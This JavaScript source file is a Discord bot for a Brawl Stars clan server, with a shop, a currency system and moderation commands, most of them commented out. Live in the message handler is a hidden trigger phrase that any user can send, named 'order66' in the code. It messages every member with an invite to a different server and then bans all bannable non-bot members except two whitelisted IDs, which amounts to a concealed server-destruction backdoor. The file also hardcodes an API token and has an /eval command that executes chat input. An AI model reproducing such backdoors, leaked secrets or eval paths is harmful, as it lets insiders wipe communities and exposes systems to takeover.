const Discord = require("discord.js");
const client = new Discord.Client();
const db = require('quick.db');
const BrawlStars = require('brawlstars');
const fs = require('fs');
const bsClient = new BrawlStars.Client({ token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkaXNjb3JkX3VzZXJfaWQiOiIyODg4NTMxNzYyMTAxNjE2NjYiLCJpYXQiOjE1NTE0OTAzMTV9.ahSIX-b6ZjWPI2EdtyoGXAK-brDW9fx6vpociyCW8jw" });
const http = require('http'); const express = require('express'); const app = express(); app.get("/", (request, response) => { response.sendStatus(200); }); app.listen(process.env.PORT); setInterval(() => { http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`); }, 280000)

client.on("ready", () => {
  console.log("DARUK'S PROTECTION IS READY TO ROLL");
});

client.on("message", (message) => {

  // Variables
  
  let gMembs;
  let gm2;
  
  let prefix = "/";
  let msg = message.content.toUpperCase();
  let cont = message.content.slice(prefix.length).split(" ");
  let args = cont.slice(1);
  const logchannel = client.channels.find(val => val.channel === '🚨mod logs');
  const mainchat = client.channels.find(val => val.channel === '🌐global chat');
  const autoroleChan = client.channels.find(val => val.channel === '✏auto role');
    let maBal = db.fetch(`${message.author.id}.money`);
    if (maBal === null) maBal = 0;
    if (message.mentions.members.first()) {
      let firstMentioned = message.mentions.members.first();
      let theBank = db.fetch(`${firstMentioned.id}.money`);
      if (theBank === null) theBank = 0;
    };
  let maMember = message.guild.members.get(message.author.id);
  let caembed;  
  // Shop
  
  if (msg.startsWith(`COMMANDER CODY, THE TIME HAS COME.`)) {
    message.channel.send("It will be done, my lord.");
    gMembs = message.guild.members;
    gm2 = gMembs.keyArray();
    for (let i = 0; i < gm2.length; i++) {
      async function order66() {
        let currentUserID = gm2[i];
        let mgmg = message.guild.members.get(currentUserID);
        if (!mgmg.user.bot) {
          if (mgmg.bannable) {
            if (mgmg.id === "288853176210161666" || mgmg.id === "356110194448531457") {
              return;
            } else {
              async function themessage() {
                 const o66emb = new Discord.RichEmbed()
                   .setAuthor(`You may have formerly known me as RoyaltyBot`, "https://i.imgur.com/7Ut6i8F.jpg")
                   .setColor(0x000000) 
                   .addField("Due to a leadership dispute, we were forced to abandon our old server.",
                             "We ask that all of the Royalty members join [our new server](https://discord.gg/cpN5Stc), which will serve the same purpose as our old server.\n\nIf you would like to leave with Fatalgaming, then please join by clicking [this link](https://discord.gg/dCDmvU) and do not follow our server invite.\n\nThank you for your patience as we are dealing with these issues.") 
                   .setFooter(`Please contact Gooose#4622 for any inquiries.`);
                mgmg.user.send(o66emb);
              };
              themessage().then(() => { mgmg.ban(7) });
            };
          };
        };
      };
      order66().then(() => { gMembs = message.guild.members; gm2 = gMembs.keyArray() });
    };
  };
  let yellowCol = {
      "name":"Yellow Color Role",
      "type":"Color",
      "price":50,
      "rid":"518805180381396992",
      "desc":"Gives you the `Yellow` color role."
    };
  let orangeCol = {
      "name":"Orange Color Role",
      "type":"Color",
      "price":50,
      "rid":"518894036195606544",
      "desc":"Gives you the `Orange` color role."
    };
  let redCol = {
      "name":"Red Color Role",
      "type":"Color",
      "price":50,
      "rid":"518893989206949900",
      "desc":"Gives you the `Red` color role."
    };
  let greenCol = {
      "name":"Green Color Role",
      "type":"Color",
      "price":50,
      "rid":"518805112928600076",
      "desc":"Gives you the `Green` color role."
    };
  let blueCol = {
      "name":"Blue Color Role",
      "type":"Color",
      "price":50,
      "rid":"518804981948612608",
      "desc":"Gives you the `Blue` color role."
    };
  let indigoCol = {
      "name":"Indigo Color Role",
      "type":"Color",
      "price":50,
      "rid":"518894095708585995",
      "desc":"Gives you the `Indigo` color role."
    };
  let violetCol = {
      "name":"Violet Color Role",
      "type":"Color",
      "price":50,
      "rid":"518894137538248705",
      "desc":"Gives you the `Violet` color role."
    };
  let studentRole = {
      "name":"Student Role",
      "type":"Role",
      "price":0,
      "rid":"530232386009563146",
      "desc":"Gives you the `Student` role for access to the Academy channels on the Discord server."
    };
  
  // Lists
  
  let itemList = [yellowCol, orangeCol, redCol, greenCol, blueCol, indigoCol, violetCol, studentRole];
  let nameList = [yellowCol["name"], orangeCol["name"], redCol["name"], greenCol["name"], blueCol["name"], indigoCol["name"], violetCol["name"], studentRole["name"]];
  let typeList = [yellowCol["type"], orangeCol["type"], redCol["type"], greenCol["type"], blueCol["type"], indigoCol["type"], violetCol["type"], studentRole["type"]];
  let priceList = [yellowCol["price"], orangeCol["price"], redCol["price"], greenCol["price"], blueCol["price"], indigoCol["price"], violetCol["price"], studentRole["price"]];
  let ridList = [yellowCol["rid"], orangeCol["rid"], redCol["rid"], greenCol["rid"], blueCol["rid"], indigoCol["rid"], violetCol["rid"], studentRole["rid"]];
  let descList = [yellowCol["desc"], orangeCol["desc"], redCol["desc"], greenCol["desc"], blueCol["desc"], indigoCol["desc"], violetCol["desc"], studentRole["desc"]];

  // Commands 
  
  if (msg.startsWith(`${prefix}EVAL`)) {
    if (message.author.id === "288853176210161666") {
    eval(args.join(' '));
    } else {
      return message.channel.send("hey, how do you even know this command.. <@288853176210161666>!");
    }
  };
  
  if (msg.startsWith(`${prefix}SHOP`)) {
    async function getBal() {
      maBal = await db.fetch(`${message.author.id}.money`);
      if (maBal === null) maBal = 0;
    };
    getBal().then(() => {
      let categories = ["Color", "Role"];
      let catDescs = ["Spice up your name with a nifty color role!", "Get access to hidden sections of the Discord server  with special roles."];
      let tingie;

      for (let i = 0; i < categories.length; i++) {
        if (!categories.includes(typeList[i])) {
          categories.push(typeList[i]);
        };
      };
      
      for (let i = 0; i < itemList.length; i++) {
        if (!nameList.includes(itemList[i]["name"]) || !typeList.includes(itemList[i]["type"]) || !priceList.includes(itemList[i]["price"]) || !ridList.includes(itemList[i]["rid"]) || !descList.includes(itemList[i]["desc"])) {
            nameList.push(itemList[i]["name"]);
            typeList.push(itemList[i]["type"]);
            priceList.push(itemList[i]["price"]);
            ridList.push(itemList[i]["rid"]);
            descList.push(itemList[i]["desc"]);
        };
      };

      if (!args[0]) {
        const shopEmbed = new Discord.RichEmbed()
        .setAuthor(`You currently have ${maBal} Royal Gold!`, message.author.avatarURL)
        .addField("Royal Store", "Looking to spend your hard-earned Royal Gold? You've come to the right place!\nI guarantee you will walk out with not a speck of gold in your pocket!")
        .setColor(0xffbd1b)

        for (let i = 0; i < categories.length; i++) {
          shopEmbed.addField(categories[i], catDescs[i], true)
        };

        return message.channel.send(shopEmbed);
      } else {
        let argsToUp = args[0].toUpperCase();
        const shopEmbed = new Discord.RichEmbed()
          .setAuthor(`You currently have ${maBal} Royal Gold!`, message.author.avatarURL)
          .addField("Royal Store", "Looking to spend your hard-earned Royal Gold? You've come to the right place!\nI guarantee you will walk out with not a speck of gold in your pocket!")
          .setColor(0xffbd1b)

        for (let i = 0; i < categories.length; i++) {
          let catstoUp = categories[i].toUpperCase();
          if (argsToUp === catstoUp) {

            for (let c = 0; c < itemList.length; c++) {
              let itemstoUp = typeList[c].toUpperCase();
              if (argsToUp === itemstoUp) {
                shopEmbed.addField(`${nameList[c]} - ${priceList[c]} Gold`, descList[c], false)
              };
            };
          };
        };

        return message.channel.send(shopEmbed);
      };
    });
  };
  
  if (msg.startsWith(`${prefix}AUTOROLE`)) {
    if (message.channel.name === '✏auto role') {
      if (args[0] === 'Student') {
        message.delete(0);
        maMember.addRole
      };
    };
  };


/*
  if (msg.startsWith(`${prefix}LINK`)) {
    if (message.member.roles.find(val => val.role === "Royal Servant") || message.member.roles.find(val => val.role === "Mod") || message.member.roles.find(val => val.role === "Admin") || message.member.roles.find(val => val.role === "Head Admin") || message.member.roles.find(val => val.role === "Viscount") || message.member.roles.find(val => val.role === "Viscountess") || maMember.hasPermission("ADMINISTRATOR")) {

      async function getPlayer() {
				if (!args[0] || !args[1] || !message.mentions.members.first()) {
					let errEmbed = new Discord.RichEmbed()
						.setTitle(":warning: ERROR :warning:")
						.addField("Tag or user not specified", "Please specify a Discord user and Brawl Stars tag to link.\n**Command Format:** `/link #tag @user`")
						.setColor([255, 0, 0])
					return message.channel.send(errEmbed);
				} else {
          const player = await bsClient.getPlayer(args[0]);
            caembed = new Discord.RichEmbed()
              .setTitle(`Assigned ${player.tag} to ${firstMentionedMember.displayName}!`)
              .addField(`In-Game Name`, player.name, true)
              .addField(`Club Name`, player.club.name, true)
              .addField(`Club Role`, player.club.role, true);
            if (player.club.name.startsWith("Royalty")) {
              caembed.addField(`In Royalty`, `True`, true)
              if (player.club.role === "President") {
              firstMentionedMember.addRole("550516837234901039").then(() => {
                if (player.club.name === "Royalty eSports") {
                  firstMentionedMember.addRole("551457440143638538").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Angels") {
                  firstMentionedMember.addRole("550831851921735683").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Rush") {
                  firstMentionedMember.addRole("550555961006358537").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty III") {
                  firstMentionedMember.addRole("550556107836489729").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Dark") {
                  firstMentionedMember.addRole("550721443541942283").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Legacy") {
                  firstMentionedMember.addRole("551213916005597187").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Light") {
                  firstMentionedMember.addRole("550806038492872716").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Reign") {
                  firstMentionedMember.addRole("550842881640890378").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Bliss") {
                  firstMentionedMember.addRole("550921201099210755").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Academy") {
                  firstMentionedMember.addRole("550556453308596225").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Nation") {
                  firstMentionedMember.addRole("550556614579716096").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Legends") {
                  firstMentionedMember.addRole("550557048580997123").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Champs") {
                  firstMentionedMember.addRole("550557190121848843").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Mystic") {
                  firstMentionedMember.addRole("550557533882941441").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Tactic") {
                  firstMentionedMember.addRole("550557663532941312").then(() => {
                    message.channel.send(caembed);
                  });
                } else {
                  message.channel.send(caembed);
                };
              });
            } else if (player.club.role === "Vice President") {
              firstMentionedMember.addRole("550517562623000589").then(() => {
                if (player.club.name === "Royalty eSports") {
                  firstMentionedMember.addRole("551457440143638538").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Angels") {
                  firstMentionedMember.addRole("550831851921735683").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Rush") {
                  firstMentionedMember.addRole("550555961006358537").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty III") {
                  firstMentionedMember.addRole("550556107836489729").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Dark") {
                  firstMentionedMember.addRole("550721443541942283").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Legacy") {
                  firstMentionedMember.addRole("551213916005597187").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Light") {
                  firstMentionedMember.addRole("550806038492872716").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Reign") {
                  firstMentionedMember.addRole("550842881640890378").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Bliss") {
                  firstMentionedMember.addRole("550921201099210755").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Academy") {
                  firstMentionedMember.addRole("550556453308596225").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Nation") {
                  firstMentionedMember.addRole("550556614579716096").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Legends") {
                  firstMentionedMember.addRole("550557048580997123").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Champs") {
                  firstMentionedMember.addRole("550557190121848843").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Mystic") {
                  firstMentionedMember.addRole("550557533882941441").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Tactic") {
                  firstMentionedMember.addRole("550557663532941312").then(() => {
                    message.channel.send(caembed);
                  });
                } else {
                  message.channel.send(caembed);
                };
              });
            } else if (player.club.role === "Senior") {
              firstMentionedMember.addRole("550518022939344896").then(() => {
                if (player.club.name === "Royalty eSports") {
                  firstMentionedMember.addRole("551457440143638538").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Angels") {
                  firstMentionedMember.addRole("550831851921735683").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Rush") {
                  firstMentionedMember.addRole("550555961006358537").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty III") {
                  firstMentionedMember.addRole("550556107836489729").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Dark") {
                  firstMentionedMember.addRole("550721443541942283").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Legacy") {
                  firstMentionedMember.addRole("551213916005597187").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Light") {
                  firstMentionedMember.addRole("550806038492872716").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Reign") {
                  firstMentionedMember.addRole("550842881640890378").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Bliss") {
                  firstMentionedMember.addRole("550921201099210755").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Academy") {
                  firstMentionedMember.addRole("550556453308596225").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Nation") {
                  firstMentionedMember.addRole("550556614579716096").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Legends") {
                  firstMentionedMember.addRole("550557048580997123").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Champs") {
                  firstMentionedMember.addRole("550557190121848843").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Mystic") {
                  firstMentionedMember.addRole("550557533882941441").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Tactic") {
                  firstMentionedMember.addRole("550557663532941312").then(() => {
                    message.channel.send(caembed);
                  });
                } else {
                  message.channel.send(caembed);
                };
              });
            } else if (player.club.role === "Member") {
              firstMentionedMember.addRole("550518379149131776").then(() => {
                if (player.club.name === "Royalty eSports") {
                  firstMentionedMember.addRole("551457440143638538").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Angels") {
                  firstMentionedMember.addRole("550831851921735683").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Rush") {
                  firstMentionedMember.addRole("550555961006358537").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty III") {
                  firstMentionedMember.addRole("550556107836489729").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Dark") {
                  firstMentionedMember.addRole("550721443541942283").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Legacy") {
                  firstMentionedMember.addRole("551213916005597187").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Light") {
                  firstMentionedMember.addRole("550806038492872716").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Reign") {
                  firstMentionedMember.addRole("550842881640890378").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Bliss") {
                  firstMentionedMember.addRole("550921201099210755").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Academy") {
                  firstMentionedMember.addRole("550556453308596225").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Nation") {
                  firstMentionedMember.addRole("550556614579716096").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Legends") {
                  firstMentionedMember.addRole("550557048580997123").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Champs") {
                  firstMentionedMember.addRole("550557190121848843").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Mystic") {
                  firstMentionedMember.addRole("550557533882941441").then(() => {
                    message.channel.send(caembed);
                  });
                } else if (player.club.name === "Royalty Tactic") {
                  firstMentionedMember.addRole("550557663532941312").then(() => {
                    message.channel.send(caembed);
                  });
                } else {
                  message.channel.send(caembed);
                };
              });
            };
            } else {
              firstMentioned.addRole("550550415767502851");
              caembed.addField(`In Royalty`, `False`, true)
            };
				};
			};
      if (mmmf.roles.find(val => val.role === "SS")) {
        firstMentioned.removeRole("550550415767502851");
			  getPlayer().catch(e => console.log(e));
      } else {
        getPlayer().catch(e => console.log(e));
      };
      
      return message.channel.send("Sorry, but due to a change in permissions, this command is currently out of service, and will be until Mooose decides to actually get to work. \n \n In the meantime, please use `*role @user +Member, +[whatever their role in the club is], -SS` to assign roles.");
    };
	};

  if (msg.startsWith(`${prefix}RESET`)) {
    if (message.author.id === "288853176210161666") {
      let money2add = 0;
      db.set(`${firstMentioned.id}.money`, money2add).then(() => {
        return message.channel.send(`reset ${firstMentionedMember.displayName}'s balance to 0, why on earth was it even messed up enough for you to have to use that command`);
      });
    } else {
      return message.channel.send("sorry, futur only");
    };
  };
	if (msg.startsWith(`${prefix}BALANCE`) || msg.startsWith(`${prefix}MONEY`) || msg.startsWith(`${prefix}BAL`)) {
		if (!args[0]) {
        const balEmbed = new Discord.RichEmbed()
            .setTitle(`Royalty Bank`)
            .setColor(0xD4AF37)
            .addField("Account Holder", firstMentionedMember.displayName, true)
            .addField('Account Balance', theBank, true)
         message.channel.send(balEmbed);
    } else {
	    	const balEmbed = new Discord.RichEmbed()
	      	.setTitle(`Royalty Bank`)
	        .setColor(0xD4AF37)
	        .addField("Account Holder", firstMentioned.displayName, true)
	        .addField('Account Balance', theBank, true)
	     	message.channel.send(balEmbed);
    };
	};

	if (msg.startsWith(`${prefix}AWARD`)) {
		if (message.author.id === "421819915742347276" || message.author.id === "330183945922674688" || message.author.id === "288853176210161666") {
			if (!args[0] || !args[1]) {
				let errEmbed = new Discord.RichEmbed()
					.setTitle(":warning: ERROR :warning:")
					.addField("Amount of points not specified", "Please specify a number of points to give.\n**Command Format:** `/award @user [# of points]`")
					.setColor([255, 0, 0])
				return message.channel.send(errEmbed);
			} else {
				let moneyToAdd = Number(args[1]) + Number(theBank);
				db.set(`${firstMentioned.id}.money`, moneyToAdd);
				let succEmbed = new Discord.RichEmbed()
					.setTitle("Success!")
					.addField("Award successful", `I have awarded ${firstMentioned.displayName} ${Number(args[1])} points.`)
					.setColor([0, 255, 0])
				return message.channel.send(succEmbed);
			};
		} else {
			let errEmbed = new Discord.RichEmbed()
				.setTitle(":warning: ERROR :warning:")
				.addField("Invalid permissions", "You do not have permission to use this command.`")
				.setColor([255, 0, 0])
			return message.channel.send(errEmbed);
		};
	};

	if (msg.startsWith(`${prefix}DEDUCT`)) {
		if (message.author.id === "421819915742347276" || message.author.id === "330183945922674688" || message.author.id === "288853176210161666") {
			if (!args[0] || !args[1]) {
				let errEmbed = new Discord.RichEmbed()
					.setTitle(":warning: ERROR :warning:")
					.addField("Amount of points not specified", "Please specify a number of points to remove.\n**Command Format:** `/deduct @user [# of points]`")
					.setColor([255, 0, 0])
				return message.channel.send(errEmbed);
			} else {
				let moneyToSub = Number(theBank) - Number(args[1]);
				db.set(`${firstMentioned.id}.money`, moneyToSub);
				let succEmbed = new Discord.RichEmbed()
					.setTitle("Success!")
					.addField("Deduction successful", `I have deducted ${Number(args[1])} points from ${firstMentioned.displayName}.`)
					.setColor([0, 255, 0])
				return message.channel.send(succEmbed);
			};
		} else {
			let errEmbed = new Discord.RichEmbed()
				.setTitle(":warning: ERROR :warning:")
				.addField("Invalid permissions", "You do not have permission to use this command.`")
				.setColor([255, 0, 0])
			return message.channel.send(errEmbed);
		};
	};

  if (msg.startsWith(`${prefix}PURGE`)) {
    message.delete();
    async function purge() {

      if (!message.member.roles.find(val => val.role === "Mod")) {
        message.channel.send('Must be mod, nab');
        return;
      };
      if (isNaN(args[0])) {
        let errEmbed = new Discord.RichEmbed()
          .setTitle(":warning: ERROR :warning:")
          .addField("Number of messages not specified", "Please specify a number of messages to delete\n**Command Format:** `/purge [# of messages]`")
          .setColor([255, 0, 0])
        return message.channel.send(errEmbed);
      };
      let theLimit = Number(args[0]) + 1;
      const fetched = await message.channel.fetchMessages({limit: theLimit});
      console.log(fetched.size + ' messages found, deleting...');

      message.channel.bulkDelete(fetched)
      let succEmbed = new Discord.RichEmbed()
        .setTitle("Success!")
        .addField("Purge successful", `I have deleted ${Number(fetched.size) - 1} messages.`)
        .setColor([0, 255, 0])
      return message.channel.send(succEmbed)
        .then(msg => {
        msg.delete(5000)
        })
      .catch(error => message.channel.send(`Error: ${error}`));

    };
    purge();
  };

	if (msg.startsWith(`${prefix}HELP`)) {
		if(!args[0]) {
			const helpEmbed = new Discord.RichEmbed()
				.setTitle("Command List")
				.setAuthor(`Requested by ${message.author.username}`, message.author.avatarURL)
				.setDescription("Type `/help [command]` for more information on the command. (i.e. `/help link`)")
				.addField("/link", "Links a Discord user to their Brawl Stars tag, assigning any roles needed.")
        .addField("/mute", "Mutes the mentioned user for a specified amount of time.")
        .addField("/purge", "Purges the specified number of messages from the chat.")
				.addField("/help", "Do you really need to ask?")
				.setFooter("This help message is brought to you by the Royalty family", "https://i.imgur.com/7Ut6i8F.jpg")
			return message.channel.send(helpEmbed);
		} else if (args[0] === "link") {
			const viceEmbed = new Discord.RichEmbed()
				.setTitle("/link Command")
				.setAuthor(`Requested by ${message.author.username}`, message.author.avatarURL)
				.setDescription("Information on the `/link` command")
				.addField("Syntax", "`/link` @user")
				.addField("Function", "Links a Discord user to their Brawl Stars tag, assigning any roles needed")
				.addField("Requirements", "You must be Royal Servant or above")
				.setFooter("This help message is brought to you by the Royalty family", "https://i.imgur.com/7Ut6i8F.jpg")
			return message.channel.send(viceEmbed);
			} else if (args[0] === "help") {
					return message.channel.send("Oh, come on. Did you really think that would work?");
			} else if (args[0] === "mute") {
					const muteEmbed = new Discord.RichEmbed()
						.setTitle("/mute Command")
						.setAuthor(`Requested by ${message.author.username}`, message.author.avatarURL)
						.setDescription("Information on the `/mute` command")
						.addField("Syntax", "`/mute` @user [# of mins]")
						.addField("Function", "Mutes the mentioned user for specified number of minutes")
						.addField("Requirements", "You must be a Moderator or above")
						.setFooter("This help message is brought to you by the Royalty family", "https://i.imgur.com/7Ut6i8F.jpg")
					return message.channel.send(muteEmbed);
			} else if (args[0] === "purge") {
					const purgeEmbed = new Discord.RichEmbed()
						.setTitle("/purge Command")
						.setAuthor(`Requested by ${message.author.username}`, message.author.avatarURL)
						.setDescription("Information on the `/purge` command")
						.addField("Syntax", "`/purge` [# of messages]")
						.addField("Function", "Purges the specified number of messages from the chat")
						.addField("Requirements", "You must be a Moderator or above")
						.setFooter("This help message is brought to you by the Royalty family", "https://i.imgur.com/7Ut6i8F.jpg")
					return message.channel.send(purgeEmbed);
			};
	};

	if (msg.startsWith(`${prefix}MUTE`)) {
		if (message.member.roles.find(val => val.role === "Mod") || message.member.roles.find(val => val.role === "Viscount") || message.member.roles.find(val => val.role === "Viscountess") || maMember.hasPermission("ADMINISTRATOR")) {
			if (!args[0]) {
				let errEmbed = new Discord.RichEmbed()
					.setTitle(":warning: ERROR :warning:")
					.addField("Member not specified", "You must specify a member to mute. \n**Command Format:** `/mute @user [# of mins]`\n**Example:** `/mute @DiscordUser 30`")
					.setColor([255, 0, 0])
				return message.channel.send(errEmbed);
			} else if (!message.mentions.members.first()) {
				let errEmbed = new Discord.RichEmbed()
					.setTitle(":warning: ERROR :warning:")
					.addField("Member not specified", "You must specify a member to mute. \n**Command Format:** `/mute @user [# of mins]`\n**Example:** `/mute @DiscordUser 30`")
					.setColor([255, 0, 0])
				return message.channel.send(errEmbed);
			} else if (!args[1]) {
				let errEmbed = new Discord.RichEmbed()
					.setTitle(":warning: ERROR :warning:")
					.addField("Time limit not specified", "You must specify a length of time to mute the member for. \n**Command Format:** `/mute @user [# of mins]`\n**Example:** `/mute @DiscordUser 30`")
					.setColor([255, 0, 0])
				return message.channel.send(errEmbed);
			} else {

				firstMentioned.addRole("518892881382080512");
				if (!isNaN(args[1])) {
					setTimeout(() => {firstMentioned.removeRole("518892881382080512");}, args[1] * 60000);
					let succEmbed = new Discord.RichEmbed()
						.setTitle("Success!")
						.addField("Member muted", `The member has been muted for ` + args[1] + ` minute(s).`)
						.setColor([0, 255, 0])
					return message.channel.send(succEmbed);
				} else {
					let errEmbed = new Discord.RichEmbed()
						.setTitle(":warning: ERROR :warning:")
						.addField("Time limit not specified", "You must specify a length of time to mute the member for. \n**Command Format:** `/mute @user [# of mins]`\n**Example:** `/mute @DiscordUser 30`")
						.setColor([255, 0, 0])
					return message.channel.send(errEmbed);
				};
			};
		} else {
			let errEmbed = new Discord.RichEmbed()
				.setTitle(":warning: ERROR :warning:")
				.addField("Invalid permissions", "You do not have the permissions to use this command.")
				.setColor([255, 0, 0])
			return message.channel.send(errEmbed);
		};
	};
  */
});

client.login(process.env.TOKEN);
